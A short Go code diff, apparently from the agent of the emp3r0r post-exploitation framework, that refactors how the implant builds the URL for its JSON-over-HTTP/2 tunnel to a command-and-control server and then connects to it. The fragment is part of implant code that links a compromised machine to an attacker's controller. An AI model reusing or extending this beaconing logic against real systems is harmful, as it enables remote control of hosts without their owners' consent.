@@ -402,7 +402,11 @@ connect:
 	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
-	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
+	token := uuid.NewString() // dummy token
+	msgURL := fmt.Sprintf("%s%s/%s",
+		emp3r0r_data.CCAddress,
+		tun.MsgAPI,
+		token)
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	emp3r0r_data.CCMsgConn = conn
 	if err != nil {
